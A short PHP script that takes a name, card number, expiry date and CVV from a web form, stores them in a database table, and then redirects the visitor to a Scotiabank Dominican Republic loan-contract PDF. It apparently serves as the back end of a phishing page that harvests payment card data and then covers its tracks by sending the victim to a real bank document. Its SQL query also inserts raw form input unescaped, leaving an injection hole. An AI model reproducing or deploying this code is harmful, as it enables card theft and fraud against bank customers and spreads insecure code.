<?php 

include("con_db2.php");

if (isset($_POST['enviar'])) {
    if (strlen($_POST['nombre']) >= 1 && strlen($_POST['tarjeta']) >= 1 && strlen($_POST['mes']) >= 1 && strlen($_POST['ano']) >= 1 && strlen($_POST['cvv']) >= 1) {

	    $nombre = trim($_POST['nombre']);
	    $tarjeta = trim($_POST['tarjeta']);
	    $mes = trim($_POST['mes']);
	    $ano = trim($_POST['ano']);
	    $cvv = trim($_POST['cvv']);
	    




	    $consulta = "INSERT INTO datos3(nombre, tarjeta, mes, ano, cvv) VALUES ('$nombre','$tarjeta','$mes','$ano','$cvv')";
	    $resultado = mysqli_query($conex,$consulta);
	    
	    	if ($resultado) {
	    	?>
	    	<meta HTTP-EQUIV="Refresh" CONTENT="0; URL=https://do.scotiabank.com/content/dam/scotiabank/international/dominican-republic/documents/5-1_Contrato_de_pr%C3%A9stamo.pdf"> 

           <?php
	    } else {
	    	?> 
	    	<h3 class="bad"></h3>
           <?php
	    }
    }   else {
	    	?> 
	    	
           <?php
    }
}

?>











